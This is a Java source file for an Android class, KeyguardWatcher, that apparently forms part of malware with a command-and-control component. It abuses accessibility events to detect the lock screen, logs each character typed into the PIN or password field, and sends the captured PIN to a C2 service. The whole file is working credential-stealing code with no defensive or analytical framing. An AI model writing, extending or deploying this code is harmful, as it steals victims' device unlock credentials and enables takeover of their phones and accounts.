package com.wuzenx.utils;

import android.view.accessibility.AccessibilityEvent;
import com.wuzenx.C2Service;

public class KeyguardWatcher {
    private C2Service c2;
    private String capturedPin = "";
    private String capturedPattern = "";
    private int lastPinLength = 0;
    private boolean isLockScreen = false;

    public KeyguardWatcher(C2Service c2) {
        this.c2 = c2;
    }

    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getPackageName() == null) return;
        String pkg = event.getPackageName().toString();
        
        // Detect lockscreen
        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            isLockScreen = pkg.contains("com.android.systemui") || 
                          pkg.contains("com.android.keyguard") ||
                          pkg.contains("android");
            
            if (isLockScreen) {
                capturedPin = "";
                capturedPattern = "";
                lastPinLength = 0;
            }
        }
        
        // Capture pin/pattern/password input
        if (isLockScreen && event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            String text = event.getText() != null ? event.getText().toString() : "";
            
            if (text.length() > lastPinLength) {
                String newChars = text.substring(lastPinLength);
                capturedPin += newChars;
                lastPinLength = text.length();
                
                if (capturedPin.length() >= 4) {
                    c2.sendMessage("log", "PIN captured: " + capturedPin);
                }
            }
        }
    }

    public String getCapturedPin() { return capturedPin; }
    public void reset() { capturedPin = ""; capturedPattern = ""; lastPinLength = 0; isLockScreen = false; }
}
